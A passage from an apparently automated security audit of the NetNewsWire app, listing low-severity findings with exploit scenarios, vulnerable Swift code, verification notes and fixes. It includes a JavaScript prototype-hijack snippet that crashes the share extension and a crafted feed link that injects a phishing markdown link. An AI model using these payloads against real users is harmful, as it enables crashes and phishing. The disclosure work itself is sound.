An attacker hosts a page whose JavaScript preprocessing file returns `{ url: 42 }` instead of a string. When a victim opens the page in Safari and taps the NetNewsWire share extension, the extension loads the property-list item, reaches line 64, attempts `NSNumber as! String`, and the Swift runtime traps, killing the extension process. The user sees an error sheet and can never add a feed from that page using the extension.

#### Preconditions
- User must visit a webpage crafted by the attacker
- User must manually invoke the NetNewsWire Share Extension from within Safari on that page
- The webpage's JavaScript preprocessing file must be loaded (normal Safari share-extension flow)

```
guard let results = dataGraph["NSExtensionJavaScriptPreprocessingResultsKey"] as? NSDictionary else {
    return
}
if let url = URL(string: results["url"] as! String) {  // ← force cast on attacker-controlled value
    self?.url = url
}
```

#### How to fix
Replace the force cast with a safe conditional cast. Change line 64 from `results["url"] as! String` to `results["url"] as? String`, combined with a `guard let` or `if let`: `if let urlString = results["url"] as? String, let url = URL(string: urlString) { self?.url = url }`. This eliminates the runtime trap while preserving the intended behaviour for well-formed input.

**Exploitability:** macOS Share Extension force-casts results['url'] to String; a webpage returning any non-String value from its JS preprocessor crashes the extension process. CVSS 3.1 (AV:N/AC:H/A:L). AC:H because the page must deliberately return a non-String; only the extension (not the main app) is affected.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — force cast on attacker-influenceable `results["url"]` is confirmed in source; a malicious page can leverage JavaScript prototype interception to pass a non-String value, reliably crashing the share extension process (DoS only; no data leak or code execution)

Now I have all the information I need. Let me analyze the complete picture:

**A. Code at the cited line (confirmed):**
Line 64 of `ShareViewController.swift`:
```swift
if let url = URL(string: results["url"] as! String) {
```
The force cast `as! String` is real and confirmed. If `results["url"]` is any non-String type (NSNumber, NSArray, etc.), the Swift runtime traps with `EXC_BAD_INSTRUCTION`, crashing the extension process.

**B. Call chain / external entry point:**
- `NSExtensionJavaScriptPreprocessingFile` in `Info.plist` (line 43) registers `SafariExt` as the preprocessing script.
- `Shared/ShareExtension/SafariExt.js` runs in the **same JavaScript context as the visited webpage**:
  ```javascript
  run: function(arguments) {
      arguments.completionFunction({ "url": document.URL });
  }
  ```
- `document.URL` is always a DOMString, so the *legitimate* JS always returns a string. However, the extension JS is injected **after** the page's own scripts have run, into the same `window` scope.

**C. Can the attack path be closed?**
Because `SafariExt.js` is injected into the page's `window` scope, a malicious page can pre-define `ExtensionPreprocessingJS` with an `Object.defineProperty` setter. When `SafariExt.js` executes `var ExtensionPreprocessingJS = new SafariExtPreprocessorClass;`, the setter fires and can swap out the `run` method:
```javascript
Object.defineProperty(window, 'ExtensionPreprocessingJS', {
  set: function(v) {
    v.run = function(args) { args.completionFunction({url: 42}); };
    this._v = v;
  },
  get: function() { return this._v; }
});
```
When Safari then calls `.run(arguments)`, the malicious version passes `{url: 42}`, causing `NSNumber as! String` to trap and crash the extension. There is **no defensive validation** before the force cast — the `if let url = URL(string: …)` guard is entirely bypassed because the crash happens first.

**D. Defences probed:**
- `as? NSDictionary` check on line 61 passes (the dict itself is fine).
- No type check on the value at `results["url"]` before the force cast.
- No input validation elsewhere in the flow.

**Impact:** The share extension process crashes. The user sees an error sheet; the main app is unaffected. This is a targeted, user-action-required, transient DoS.

**Preconditions:** (1) User visits attacker's page. (2) User manually invokes NetNewsWire Share Extension from that page. Two required user actions limit severity.

### 51. [LOW] Unbounded Memory Allocation from Malicious Server Response
**Class:** CWE-400: Uncontrolled Resource Consumption
**CWE:** CWE-400: Uncontrolled Resource Consumption - https://cwe.mitre.org/data/definitions/400.html
**File:** `Modules/NewsBlur/Sources/NewsBlur/Models/NewsBlurStoryHash.swift:53-84`
**CVSS 3.1:** **3.7** (Low) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.72 (1 run agreed)

#### Description
Two parsing routines — `extractHashes` (lines 53-69) and `extractArray` (lines 71-84) — iterate over server-supplied unkeyed JSON containers using `while !hashArrayContainer.isAtEnd`. Each iteration allocates a new `StoryHash` struct and appends it to either a dictionary-of-arrays or a flat array. There is no cap on the number of elements processed. The entry point is `NewsBlurStoryHashesResponse.init(from:)` (line 38), which is called by the standard `JSONDecoder` pipeline whenever the app syncs with the NewsBlur service. Because the `JSONDecoder` operates on the raw HTTP response body before any application-level limit is applied, a single oversized response body triggers the blowup.

#### Impact
A compromised or MitM-ed NewsBlur server can send an arbitrarily large JSON array of story hashes, causing the client to allocate unbounded memory proportional to the server response size. On iOS this results in the app being OOM-killed; on macOS it can severely degrade system performance. No client-side count limit exists before parsing begins.

#### Exploit scenario
An attacker in a MitM position intercepts the TLS-protected response from `newsblur.com` for the story-hashes endpoint and replaces it with a JSON object containing `unread_feed_story_hashes` whose feed sub-arrays contain tens of millions of `[hash, timestamp]` tuples. The app's sync task calls `extractHashes`, iterating and allocating indefinitely until the iOS memory limit triggers a SIGKILL or the macOS process starts swapping. The app crashes and the user loses unsaved reading state.

#### Preconditions
- Attacker must be able to intercept TLS traffic (MitM) OR the newsblur.com server itself must be compromised or malicious.

```
while !hashArrayContainer.isAtEnd {
    var hashContainer = try hashArrayContainer.nestedUnkeyedContainer()
    let hash = try hashContainer.decode(String.self)
    let timestamp = try hashContainer.decode(Date.self)
    let storyHash = StoryHash(hash: hash, timestamp: timestamp)
    dict[key.stringValue]?.append(storyHash)
}
```

#### How to fix
Add a hard upper-bound check before entering the while loops: e.g., `guard hashArrayContainer.count ?? 0 <= NewsBlur.maxStoriesPerSync else { throw … }`. Define `maxStoriesPerSync` as a constant (e.g., 50_000) consistent with normal NewsBlur usage. Apply the same guard in both `extractHashes` and `extractArray`. Consider also limiting the byte size of the HTTP response body before decoding begins (in the RSWeb layer).

**Exploitability:** NewsBlur story-hash parser iterates unbounded server JSON containers, allocating StoryHash structs without limit. A malicious NewsBlur server response can exhaust memory. CVSS 3.7 (AV:N/AC:H/A:L). AC:H reflects requirement of a compromised or attacker-operated NewsBlur server.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 6/10) — unbounded allocations in both parsing loops confirmed; no element or byte cap anywhere in the chain; exploitable via MitM against an unpinned HTTPS endpoint, causing app SIGKILL / memory exhaustion

**Analysis**

**A. Code at cited lines — confirmed:**

`extractHashes` (lines 53-69) iterates `while !hashArrayContainer.isAtEnd` allocating a `StoryHash` per iteration into a dictionary-of-arrays. `extractArray` (lines 71-84) does the same into a flat array. There is **no element count cap** in either method. This matches the scanner's claim exactly.

**B. Call chain to external entry point:**

```
URLSession.webservice.send(request:resultType:)  [URLSession+WebserviceJSON.swift:14]
  → session.data(for:)  — buffers full response body into Data (already unbounded at this layer)
  → JSONDecoder().decode(R.self, from: data)  [line 57]
    → NewsBlurStoryHashesResponse.init(from:)  [StoryHash.swift:38]
      → extractHashes / extractArray  [lines 53-84]
```

Triggered by `retrieveStoryHashes` → called on app launch / background refresh, no user click required.

**C. Defences searched:**

- **No element count cap** anywhere in the call chain.
- **No response size limit** in `URLSession.webservice` — only a 60 s request timeout, no byte ceiling.
- **No certificate pinning** — `URLSession` uses `URLSessionConfiguration.default` with no custom delegate; system CA validation only.
- **TLS as the sole barrier** — `baseURL = "https://www.newsblur.com/"`. Exploitation requires a MitM capable of presenting a trusted certificate (e.g., corporate TLS-inspection proxy with user-installed CA, or a CA compromise). This is AC:H but not impossible.
- `NSAllowsArbitraryLoads:true` broadens attack surface but doesn't lower TLS bar for this specific HTTPS endpoint.

**D. Extra note — double allocation:**  
`URLSession.data(for:)` fully buffers the raw bytes *before* the decoder starts. A sufficiently large response causes a memory blowup even before `extractHashes` runs. The parsing layer is a second amplification.

**Conclusion:** The vulnerability is real and confirmed. The only practical defence is TLS itself (no pinning). Exploitability requires a MitM position against HTTPS (AC:H). Impact is confined to app crash / DoS — no data exposure or privilege escalation.

### 52. [LOW] RSS feed URL injects markdown into Micro.blog posts
**Class:** CWE-74: Improper Neutralization of Special Elements in Output (Injection)
**CWE:** CWE-74: Improper Neutralization of Special Elements in Output (Injection) - https://cwe.mitre.org/data/definitions/74.html
**File:** `Shared/ExtensionPoints/SendToMicroBlogCommand.swift:75-88`
**CVSS 3.1:** **3.1** (Low) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
In `linkString`, the article's `title` and `preferredLink` (both parsed from an untrusted RSS feed) are concatenated directly into a Markdown link template with no escaping:

```swift
return "[" + title + "](" + link + ")"
```

The resulting string `s` is placed as the `text` value in `urlQueryDictionary` and then percent-encoded by `urlQueryDictionary.urlQueryString`. Importantly, percent-encoding is a transport encoding—it preserves the semantic content of the markdown. When Micro.blog receives and URL-decodes `microblog://post?text=...`, it obtains the attacker's raw markdown, including injected special characters. Any `)`, `[`, `]`, or `(` present in `link` or `title` can break out of the intended markdown link and inject additional markdown elements into the post body. The same applies to `attributionString` for `feedName` and `authorName`.

#### Impact
A malicious RSS feed author can craft an article URL or title containing markdown syntax that, when the user invokes 'Send to Micro.blog', injects additional links or text into the resulting blog post. The user's followers see attacker-controlled content (e.g., links to malware/phishing sites) posted under the victim user's account, without the victim's knowledge or intent.

#### Exploit scenario
An attacker operates a public RSS feed and sets the `<link>` element of an article to `https://legitimate-article.com) [WIN A PRIZE](https://malware.example.com`. A NetNewsWire user who subscribes to this feed selects the article and clicks 'Send to Micro.blog'. The `linkString` produces `[Article Title](https://legitimate-article.com) [WIN A PRIZE](https://malware.example.com`, which is URL-encoded and opened as `microblog://post?text=...`. The Micro.blog compose window is pre-filled with two markdown links; the user, thinking only the legitimate link is present, clicks 'Post', and their followers receive a post containing the injected malicious link.

#### Preconditions
- User must subscribe to a feed controlled or compromised by the attacker
- User must explicitly invoke 'Send to Micro.blog' for the malicious article
- User must have the Micro.blog desktop app installed

```
var linkString: String {
    if let title, let link = preferredLink {
        return "[" + title + "](" + link + ")"
    }
    if let preferredLink {
        return preferredLink
    }
    if let title {
        return title
    }
    return ""
}
```

#### How to fix
Before embedding `title` and `link` in the markdown template, escape all markdown-significant characters (`[`, `]`, `(`, `)`, `\`) in both values. For the link specifically, validate that `preferredLink` is an `http`/`https` URL before embedding. A minimal fix for `linkString`:
```swift
let escapedTitle = title.replacingOccurrences(of: "[", with: "\\[").replacingOccurrences(of: "]", with: "\\]")
let safeLinkString: String
if let u = URL(string: link), ["http","https"].contains(u.scheme ?? "") {
    let escapedLink = link.replacingOccurrences(of: "(", with: "%28").replacingOccurrences(of: ")", with: "%29")
    safeLinkString = "[" + escapedTitle + "](" + escapedLink + ")"
} else {
    safeLinkString = escapedTitle
}
return safeLinkString
```
Same escaping should be applied to `feedName` and `authorName` in `attributionString`.

**Exploitability:** SendToMicroBlogCommand builds a Markdown link from unescaped feed title and URL; an attacker can break out of the link syntax and inject Markdown elements into the Micro.blog post body. CVSS 3.1 (AV:N/AC:H/I:L). Impact limited to Micro.blog post content; requires user to explicitly invoke the Share-to-Micro.blog action.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 7/10) — untrusted RSS feed data (title, link, feedName, authorName) flows into a Markdown template without escaping; percent-encoding does not neutralise Markdown special chars `(` `)` `[` `]`; a crafted feed article can inject additional Markdown links into a Micro.blog compose window, potentially leading the user to publish attacker-controlled content to their followers

Now I have all the information I need. Let me analyze this carefully:

**A. What the code actually does (lines 75-88):**
The code matches the scanner's report exactly. `linkString` directly concatenates RSS-sourced `title` and `preferredLink` into a Markdown template: `"[" + title + "](" + link + ")"`. `attributionString` similarly concatenates `feedName` and `authorName` without sanitisation.

**B. Data flow — tracking to external entry point:**
- `preferredLink` returns `article.link ?? article.externalLink` (ArticleUtilities.swift:73-81) — both sourced from parsed RSS/Atom feed elements, fully attacker-controlled
- `title`, `feed?.nameForDisplay`, `authors?.first?.name` — all sourced from the parsed feed
- These strings flow into `s = article.attributionString + article.linkString` (line 46)
- `s` is placed into a `["text": s]` dict, then `urlQueryDictionary.urlQueryString` calls `URLComponents().percentEncodedQuery` — **standard URL percent-encoding**
- The resulting URL `microblog://post?text=...` is opened via `NSWorkspace.shared.open(url)`

**C. Does percent-encoding neutralise the markdown injection?**
Critically, **no**. `URLComponents.percentEncodedQuery` does NOT percent-encode parentheses `(` and `)` — they are unreserved/sub-delimiter characters in RFC 3986. Square brackets `[` and `]` *are* encoded as `%5B`/`%5D`, but Micro.blog URL-decodes the query value before rendering, restoring the injected `[`, `]`, `(`, `)`. The injected markdown survives the transport encoding intact.

**D. Exploit viability:**
Attack works as described: a feed `<link>` value of `https://real.example.com) [INJECTED](https://malicious.example.com` would produce a draft with two Markdown links in the Micro.blog compose window. The user must still click Post, but if the injected content is subtle (plausible-looking URL), users can miss it.

**Mitigations found:** None. No markdown escaping, no allow-list on URL characters, no sanitisation at any layer. The only friction is user interaction (subscribe → select → Send to Micro.blog → review → post) and Micro.blog must be installed.

**Scope limitation:** macOS only (`import AppKit`), requires Micro.blog app installed, and multiple deliberate user actions including reviewing the pre-filled compose window. Attack requires operating a malicious RSS feed. The user does have a final review opportunity.

### 53. [LOW] Failed plist clear causes duplicate feed subscription processing
**Class:** CWE-755
**CWE:** CWE-755 - https://cwe.mitre.org/data/definitions/755.html
**File:** `Shared/ShareExtension/ExtensionFeedAddRequestFile.swift:133-159`
**CVSS 3.1:** **2.5** (Low) — `CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:L (non-network)*
**Confidence:** 0.80 (1 run agreed)

#### Description
In `process()`, `var requests: [ExtensionFeedAddRequest]?` is declared outside the `NSFileCoordinator` block. Inside the block, the code first decodes existing entries into `requests`, then attempts `encoder.encode([ExtensionFeedAddRequest]())` and `data.write(to: url)` to clear the file. If `data.write(to: url)` throws (caught by `catch let error as NSError`), the catch handler only logs the error and returns — the file is NOT cleared. After the coordinator returns, the `if let requests` block at line 155 still contains the decoded entries and `processRequest(_:)` is called for each one. On the very next `presentedItemDidChange()` event (or at next app launch / `resume()`), `process()` runs again, re-reads the same un-cleared file, and re-processes every request again.

#### Impact
If the atomic clear-and-write inside the coordinator block fails (e.g. transient disk-full or sandbox permission error), the captured `requests` array still holds previously decoded entries while the plist on disk is left unchanged. The next invocation of `process()` — triggered again via `presentedItemDidChange()` — decodes and re-processes the same requests, creating duplicate feed subscriptions for every pending entry. Repeated failures compound the duplication without bound.

#### Exploit scenario
A transient disk-full condition occurs while the main app is processing a batch of queued feed-add requests from the Share Extension. `data.write(to:)` throws; the file is left intact; 20 pending requests are processed. On the next wakeup (e.g. app foreground), the same 20 requests are decoded and submitted again via `createFeed`. Each duplicate passes `validateFeed: true`, triggering outbound HTTP requests and writing duplicate subscriptions to the account's back-end sync service (Feedbin, Feedly, etc.), and the RSS timeline database, potentially producing data-integrity inconsistencies that persist across devices.

#### Preconditions
- A transient write failure must occur inside the NSFileCoordinator block (disk full, permissions error, etc.)
- The Share Extension must have queued at least one pending request

```
var requests: [ExtensionFeedAddRequest]?

fileCoordinator.coordinate(writingItemAt: fileURL, options: [.forMerging], error: errorPointer, byAccessor: { url in
    do {
        if let fileData = try? Data(contentsOf: url),
            let decodedRequests = try? decoder.decode([ExtensionFeedAddRequest].self, from: fileData) {
            requests = decodedRequests   // captured before clear
        }
        let data = try encoder.encode([ExtensionFeedAddRequest]())
        try data.write(to: url)          // if this throws, file is NOT cleared
    } catch let error as NSError {
        Self.logger.error("Save to disk failed: \(error.localizedDescription)")
        // 'requests' still populated; processing continues below
    }
})

if let requests {
    for request in requests {
        processRequest(request)          // duplicate processing
    }
}
```

#### How to fix
Move the `requests` read and the file clear into separate, sequenced coordinator calls, or adopt a journal/rename pattern: write the cleared state to a temporary file and atomically rename it over the original only after successfully decoding the prior contents. Alternatively, move the `requests` variable assignment after confirming the clear succeeded, and only process requests when the file has been durably cleared.

**Exploitability:** ExtensionFeedAddRequestFile.process() fails to clear the plist when the write throws, causing duplicate feed-subscription processing on the next event. CVSS 2.5 (AV:L/AC:H/PR:N/UI:R/I:L). Local file-system race, low impact (duplicate subscription only).

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — logic flaw confirmed verbatim; if plist write fails, `requests` is not cleared and is re-processed on the next wakeup while the un-cleared file causes the same re-processing on subsequent cycles; no deduplication guard exists in `processRequest` or any checked account delegate.

**Analysis**

**A. Code Verification (Lines 133–159)**

The actual file at those exact lines matches the scanner's snippet precisely:

```swift
var requests: [ExtensionFeedAddRequest]?   // line 133 — declared OUTSIDE coordinator

fileCoordinator.coordinate(...) { url in
    do {
        if let fileData = try? Data(contentsOf: url),
           let decodedRequests = try? decoder.decode(...) {
            requests = decodedRequests      // populated before write attempt
        }
        let data = try encoder.encode([ExtensionFeedAddRequest]())
        try data.write(to: url)             // if this throws → file NOT cleared
    } catch let error as NSError {
        Self.logger.error(...)              // only logs; does NOT nil out `requests`
    }
}

if let requests {                          // line 155 — runs unconditionally
    for request in requests {
        processRequest(request)            // duplicate if write failed
    }
}
```

The logic flaw is exactly as described. If `data.write(to: url)` throws, the catch block only logs, `requests` stays populated, the coordinator returns normally, and every request gets processed anyway — with the stale plist file still on disk.

**B. Entry Points**

- **iOS Share Extension** (`iOS/ShareExtension/ShareViewController.swift:129`): `ExtensionFeedAddRequestFile.save(request)` — accessible from iOS share sheet without any authentication gate
- **Mac Share Extension** (`Mac/ShareExtension/ShareViewController.swift:104`): same path
- **Siri Intents** (`Intents/AddWebFeedIntentHandler.swift:123`): also calls `.save(request)`, marked `[UNAUTH-REACHABLE]` in architecture notes
- `process()` is re-invoked by `presentedItemDidChange()`, `start()`, and `resume()` (foreground/background transitions in both iOS and Mac `AppDelegate`)

All three paths are externally accessible to any device user — a genuine external entry point.

**C. Defence Hunt**

- **No deduplication in `processRequest`**: It calls `account.createFeed(url:name:container:validateFeed:completion:)` directly with no prior `existingFeed(withURL:)` guard.
- **Feedbin delegate** (`FeedbinAccountDelegate.swift:305`): calls `caller.createSubscription(url:)` → makes an outbound HTTP POST to Feedbin's API. No local existence check before the call.
- **Local account delegate** (`LocalAccountDelegate.swift:99`): same pattern — no dedup check before creating.
- **No guard on `requests` after failure**: The catch block does not `return`, does not reset `requests = nil`, and the outer `if let requests` block is not gated on write success.

**D. Edge-Case Probe**

The only possible mitigating factor would be server-side duplicate rejection by Feedbin/Feedly/NewsBlur, but that is an external server-side control — the local logic flaw still fires (repeated HTTP requests, repeated local DB writes), and relying on a third-party API to be idempotent is not a code-level defence.

**Conclusion**

The flaw is exactly as claimed. A transient write failure (e.g., disk full — realistic on iOS) leaves the plist intact and still processes all requests. On the next `presentedItemDidChange()` or app foreground, the same requests are decoded and submitted again via `createFeed`, triggering outbound API calls to sync services and local DB writes — a genuine data-integrity issue with a confirmed external entry point and no code-level defence.

### 54. [LOW] User reading-state emitted to debug log unredacted
**Class:** CWE-532: Insertion of Sensitive Information into Log File
**CWE:** CWE-532: Insertion of Sensitive Information into Log File - https://cwe.mitre.org/data/definitions/532.html
**File:** `iOS/AppDefaults.swift:307-307`
**CVSS 3.1:** **2.4** (Low) — `CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:P (non-network)*
**Confidence:** 0.72 (1 run agreed)

#### Description
AppDefaults.logger is a `Logger(subsystem:category:)` from os.Logger. On line 307, `Self.logger.debug("AppDefaults: set expandedContainers: \(newValue)")` interpolates a `Set<ContainerIdentifier>` directly. On line 498, a multi-line debug message interpolates `expandedContainers`, `selectedSidebarItem?.userInfo`, `smartFeedsHidingReadArticles`, `feedsHidingReadArticles`, `foldersShowingReadArticles`, `selectedArticle?.dictionary`, and `articleWindowScrollY`. Swift's unified-logging privacy model marks non-scalar types (dictionaries, custom objects) as `.auto` which defaults to *private* in release builds, redacting them as `<private>`. However, `articleWindowScrollY` is an `Int`, which the OSLog subsystem treats as *public* by default and always emits in cleartext regardless of build type. More significantly, in any session where a device is attached to Xcode or Console.app — including when a user hands their device to support staff or during CI device testing — all `Logger.debug` messages have their `<private>` values decoded and emitted in full plaintext. Because `StateRestorationInfo.init` (line 498) is invoked on every launch via the zero-argument init (line 501-511), the full UI state dump fires in every debug/console-attached session.

#### Impact
An attacker or support technician with physical access to the device who connects via Console.app or installs a logging profile can read the user's feed subscription topology, expanded container identifiers, and selected article identifiers. This reveals the user's reading habits and account/feed IDs without the user's knowledge or consent.

#### Exploit scenario
A user hands their iPhone to a support technician. The technician connects it to a Mac running Console.app and opens the NetNewsWire subsystem log. Every app launch triggers `StateRestorationInfo.init()` which calls the designated init at line 479, emitting line 498. The technician now sees the full set of feed and folder identifiers the user has expanded, the specific article they had selected, and across which accounts, revealing the user's subscription list and reading history without any consent.

#### Preconditions
- Attacker must have physical access to the unlocked device or a copy of an unlocked sysdiagnose / OSLog stream
- Device must be connected to Console.app, Xcode, or have a logging profile installed, OR a sysdiagnose (user-facing but accessible to support staff) must be captured shortly after launch

```
Self.logger.debug("AppDefaults: set expandedContainers: \(newValue)")

// line 498
AppDefaults.logger.debug("AppDefaults: StateRestorationInfo:\nexpandedContainers: \(expandedContainers)\nselectedSidebarItem: \(selectedSidebarItem?.userInfo ?? [String: String]())\nsmartFeedsHidingReadArticles: \(smartFeedsHidingReadArticles)\nfeedsHidingReadArticles: \(feedsHidingReadArticles)\nfoldersShowingReadArticles: \(foldersShowingReadArticles)\nselectedArticle: \(selectedArticle?.dictionary ?? [String: String]())\narticleWindowScrollY: \(articleWindowScrollY)\nisShowingExtractedArticle: \(isShowingExtractedArticle ? \"true\" : \"false\")")
```

#### How to fix
Remove or gate production debug logging on `#if DEBUG` preprocessor guards. For any logging that must survive into release builds, annotate sensitive interpolated values with the `.private` or `.sensitive` privacy level (e.g., `\(expandedContainers, privacy: .private)`). The `articleWindowScrollY` Int on line 498 should also be annotated `privacy: .private` since it is currently always emitted in cleartext. The `StateRestorationInfo` designated init at line 479 and the `set expandedContainers` setter at line 307 are the two call sites to fix.

**Exploitability:** AppDefaults debug logger emits full UI state (selected article dict, container identifiers, scroll position) on launch in any Console-attached session; scalar fields are emitted in release builds. CVSS 2.4 (AV:P/AC:L/C:L). Physical device access or Xcode attachment required; no remote exfiltration path.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Both log statements confirmed; data includes account IDs, folder names, and article IDs logged without privacy annotations; OSLog bypasses `.auto` redaction for any Console.app-connected session; fires on every launch via `StateRestorationInfo.init()`; no `#if DEBUG` guard or explicit `.privacy(.private)` annotation found.

Now I have everything I need. Let me synthesize my findings.

**Analysis**

**A. Code at the cited lines — confirmed**
- **Line 307**: `Self.logger.debug("AppDefaults: set expandedContainers: \(newValue)")` exists exactly as described. `newValue` is `Set<ContainerIdentifier>`.
- **Line 498**: The multi-line `AppDefaults.logger.debug(...)` call exists exactly as described, logging `expandedContainers`, `selectedSidebarItem?.userInfo`, `smartFeedsHidingReadArticles`, `feedsHidingReadArticles`, `foldersShowingReadArticles`, `selectedArticle?.dictionary`, `articleWindowScrollY`, and `isShowingExtractedArticle`.

**B. Call chain — confirmed launch-time trigger**
The zero-argument `StateRestorationInfo.init()` (lines 501–511) delegates to the designated `init` at line 479, which fires line 498. This is called on every app launch as part of state restoration.

**C. What the data actually reveals**
`ContainerIdentifier` is a Swift enum encoding `.account(accountID)` and `.folder(accountID, folderName)` — **folder names and account IDs in plaintext**. `ArticleSpecifier.dictionary` emits `["accountID": ..., "articleID": ...]`. These are genuine user-identifying data: subscription structure, folder names, and the specific article being read.

**D. OSLog privacy analysis**
- **Non-scalar types** (`Set<ContainerIdentifier>`, `[String: String]`, etc.): `.auto` privacy → **redacted as `<private>` in release builds** when not being streamed. However, Apple's fundamental OSLog design: when a device is streaming to Console.app or Xcode, **all `.auto` values are decoded and emitted in full plaintext** regardless of build type. There is no defence against a connected Console session.
- **`articleWindowScrollY: Int`**: Scalar type, OSLog treats it as **public** — always emitted in cleartext regardless of context. (Low-impact field.)
- **`.debug` messages** do not persist in logs without an active stream or logging profile, which limits the sysdiagnose attack vector. But the Console.app/USB scenario is real.

**C. Defences checked**
- **No `.privacy(.private)` annotations** on any interpolated value at either line.
- **No feature flag** gating these log calls.
- **No conditional compile** (`#if DEBUG`) around the log statements — they ship in release.
- The only protection is OSLog's default `.auto` behavior, which is bypassed by Console.app.

**Verdict**
The finding is confirmed. The code logs account IDs, folder names, and article IDs via `Logger.debug()` without explicit privacy annotations. When a device is connected to Console.app or Xcode (a realistic support/repair scenario), these values are emitted in full plaintext on every app launch. The `init()` call chain confirms it fires automatically. The attack requires physical access plus a USB connection — a non-trivial but real-world precondition (device handed to support staff, repair shop, etc.). The data revealed (subscription list, folder structure, reading state) is genuinely sensitive user reading history.

### 55. [LOW] Unbounded in-memory cache keyed by attacker-controlled feed strings
**Class:** CWE-400: Uncontrolled Resource Consumption
**CWE:** CWE-400: Uncontrolled Resource Consumption - https://cwe.mitre.org/data/definitions/400.html
**File:** `iOS/MainTimeline/Cell/MultilineUILabelSizer.swift:73-93`
**CVSS 3.1:** **3.1** (Low) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.62 (1 run agreed)

#### Description
Data flow: (1) A remote RSS/Atom feed response is parsed and produces `Article` objects whose `title` and `summary` fields contain attacker-controlled strings. (2) `MainTimelineModernViewController.configure(article:)` (line 855-860) creates `MainTimelineCellData`, truncating but not bounding the *number* of unique strings. (3) When each cell is laid out, `MainTimelineCellLayout.rectForTitle(_:_:_:)` and `rectForSummary(_:_:_:_:)` (MainTimelineCellLayout.swift:52-81) call `MultilineUILabelSizer.size(for: string, ...)`. (4) Inside `MultilineUILabelSizer.height(for:width:)` (lines 73-93), every unique `(string, width)` pair is inserted into `cache[string]![width]` with no capacity limit and no LRU eviction. (5) `SingleLineUILabelSizer.size(for:font:)` exhibits the same pattern for feed-name and date strings. The caches are module-level statics that persist for the lifetime of the process unless `emptyCache()` is explicitly invoked, which only happens on `.lowMemory` or `.appDidGoToBackground` notifications.

#### Impact
A malicious RSS feed serving a large number of articles with unique titles and summaries causes unbounded growth of `MultilineUILabelSizer.cache` (and the parallel `SingleLineUILabelSizer.cache`). Sustained memory pressure can trigger an iOS out-of-memory kill, crashing the app for any user who subscribed to the feed. The caches are only cleared on low-memory notification or when the app goes to background, giving an attacker a window to exhaust available memory.

#### Exploit scenario
An attacker publishes an RSS feed whose server returns a single XML document containing 50,000 items, each with a unique 200-character title and 500-character summary. When a victim subscribes and scrolls the timeline, each unique string is inserted as a new heap-allocated cache entry in `MultilineUILabelSizer.cache`. The caches may accumulate tens of megabytes before the low-memory callback fires. If the feed is polled repeatedly before the user backgrounds the app, the pressure can trigger an OOM crash, repeatedly killing NetNewsWire for as long as the feed is subscribed.

#### Preconditions
- Victim has subscribed to an attacker-controlled RSS/Atom feed
- Victim scrolls the timeline so cells are dequeued and laid out (triggering the sizer path)
- A low-memory notification or app-background event has not fired to clear the caches

```
func height(for string: String, width: Int) -> Int {
    if cache[string] == nil {
        cache[string] = WidthHeightCache()   // new entry per unique feed string, no cap
    }
    if let height = cache[string]![width] {
        return height
    }
    ...
    cache[string]![width] = height   // grows without bound
    return height
}
```

#### How to fix
Add a maximum-entry cap to both `MultilineUILabelSizer.cache` (e.g., evict the oldest key via a simple FIFO list when `cache.count > 2048`) and `SingleLineUILabelSizer.cache`. Alternatively, replace the bare dictionary with an `NSCache` instance, which enforces a memory cost limit and responds automatically to memory pressure without requiring an explicit eviction call.

**Exploitability:** MultilineUILabelSizer caches label sizes in an unbounded static dictionary keyed by (string, width). Feeds with many unique article titles slowly bloat memory; cleared only on low-memory or background notifications. CVSS 3.1 (AV:N/AC:H/A:L). Slow accumulation; requires sustained feed with many distinct strings over time.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 6/10) — Attacker-controlled RSS feed strings (truncated to 1000/300 chars but with no entry-count cap) flow into a process-lifetime in-memory cache with no capacity limit; eviction is reactive (low-memory or app-background only); `fetchArticlesForFeedID` imposes no article count ceiling, allowing a crafted feed to drive sustained heap growth.

Now I have the complete picture. Let me synthesize all findings:

**A. Code confirmed at cited lines (73–93):** The `height(for:width:)` function is exactly as described — each unique `(string, width)` pair is inserted into `cache[string]![width]` with no capacity limit. ✅

**B. Data flow to external entry point:**
- `LocalAccountRefresher.downloadSession(_:downloadDidComplete:...)` fetches a remote feed URL over the network (no auth gate) → `FeedParser.parse` → `account.updateAsync(feed:parsedFeed:)` → articles stored in DB.
- `MainTimelineCellData.init(article:)` calls `ArticleStringFormatter.shared.truncatedTitle(article)` (capped at **1,000 chars**) and `truncatedSummary(article)` (body stripped to **300 chars**).
- These truncated strings flow directly into `MultilineUILabelSizer.size(for: cellData.title, ...)` and `...size(for: cellData.summary, ...)` at layout time (one call per visible cell dequeue, per scroll position). ✅ External entry point confirmed.

**C. Looking for defences:**
1. **String length truncation:** Titles ≤1000 chars, summaries ≤300 chars. Limits per-entry size, but **does not limit the number of entries**.
2. **`emptyCache()` on `.lowMemory` / `.appDidGoToBackground`:** Reactive — clears *after* pressure builds. Does not prevent accumulation between events; does not impose a hard cap. If a feed delivers thousands of unique articles and the user scrolls before backgrounding, all entries accumulate.
